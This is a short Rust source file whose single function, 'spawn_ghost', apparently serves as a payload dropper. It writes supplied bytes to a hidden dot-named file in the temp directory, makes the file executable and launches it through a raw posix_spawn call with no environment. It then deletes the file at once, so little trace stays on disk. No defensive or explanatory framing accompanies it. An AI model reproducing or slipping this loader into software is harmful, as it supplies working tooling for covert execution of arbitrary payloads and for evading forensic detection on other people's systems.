use std::ffi::CString;
use std::io::Write;
use std::os::unix::fs::PermissionsExt;

extern "C" {
    fn posix_spawn(
        pid: *mut i32,
        path: *const i8,
        file_actions: *const std::ffi::c_void,
        attrp: *const std::ffi::c_void,
        argv: *const *const i8,
        envp: *const *const i8,
    ) -> i32;
}

pub fn spawn_ghost(payload: &[u8], argv: &[&str]) -> Result<(), &'static str> {
    let dir = std::env::temp_dir();
    let path = dir.join(format!(".gh_{}", std::process::id()));
    {
        let mut f = std::fs::File::create(&path).map_err(|_| "create")?;
        f.write_all(payload).map_err(|_| "write")?;
        let mut perms = f.metadata().map_err(|_| "meta")?.permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&path, perms).map_err(|_| "chmod")?;
    }

    let argv_c: Vec<CString> = argv.iter().map(|a| CString::new(*a).unwrap()).collect();
    let mut argv_p: Vec<*const i8> = argv_c.iter().map(|c| c.as_ptr()).collect();
    argv_p.push(std::ptr::null());

    let mut pid: i32 = 0;
    let path_c = CString::new(path.to_string_lossy().as_bytes()).unwrap();
    let ok = unsafe {
        posix_spawn(
            &mut pid,
            path_c.as_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            argv_p.as_ptr(),
            std::ptr::null(),
        )
    };
    let _ = std::fs::remove_file(&path);
    if ok != 0 {
        return Err("posix_spawn");
    }
    Ok(())
}
